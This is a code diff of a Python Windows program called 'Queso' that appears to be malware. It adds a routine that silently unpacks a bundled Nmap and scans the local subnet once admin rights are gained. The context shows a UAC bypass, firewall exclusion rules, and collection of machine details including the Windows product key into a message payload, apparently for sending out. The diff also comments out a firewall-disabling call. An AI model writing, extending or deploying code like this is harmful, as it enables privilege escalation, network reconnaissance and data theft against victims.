@@ -1,5 +1,4 @@
 import os
-import shutil
 import sys
 import subprocess
 import ctypes
@@ -9,6 +8,7 @@ import json
 import random
 import nmap3
 from xml.etree import ElementTree
+import zipfile
 
 
 class Syscalls:
@@ -130,6 +130,11 @@ class Network:
         subprocess.Popen("netsh advfirewall firewall add rule name='tcpclient' dir='in' action='allow' program='{}'".format(path))
 
     @staticmethod
+    def InstallNmap() -> None:
+        with zipfile.ZipFile(os.path.join(sys._MEIPASS, "nmap.zip"), "r") as zip:
+            zip.extractall("C:\\Program Files (x86)")
+
+    @staticmethod
     def NmapScan() -> ElementTree:
         nmap = nmap3.Nmap()
         return nmap.scan_command("192.168.1.1/24", arg="-sV -T4 -O -F --version-light")
@@ -178,8 +183,11 @@ class Queso:
                     Utility.UACbypass()
 
         if Utility.IsAdmin():
-            Network.DisableFirewall()
+            # Network.DisableFirewall()
             Network.ExcludeFromFirewall()
+
+            if not os.path.exists("C:\\Program Files (x86)\\Nmap"):
+                Network.InstallNmap()
 
             for func, daemon in admin_tasks:
                 thread = Thread(target= func, daemon= daemon)
@@ -208,6 +216,15 @@ class Queso:
         gpu = subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode(errors= 'ignore').splitlines()[2].strip()
         productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip()
 
+        sys_info = f"""
+            \nComputer Name: {computerName}
+            \nOS: {computerOS}
+            \nUUID: {uuid}
+            \nCPU: {cpu}
+            \nGPU: {gpu}
+            \nProduct Key: {productKey}
+        """
+
         http = PoolManager()
 
         try:
@@ -224,15 +241,6 @@ class Queso:
             ip_info = "(No IP info)"
         else:
             ip_info = data
-
-        sys_info = f"""
-            \nComputer Name: {computerName}
-            \nOS: {computerOS}
-            \nUUID: {uuid}
-            \nCPU: {cpu}
-            \nGPU: {gpu}
-            \nProduct Key: {productKey}
-        """
 
         payload = {
             "embeds": [
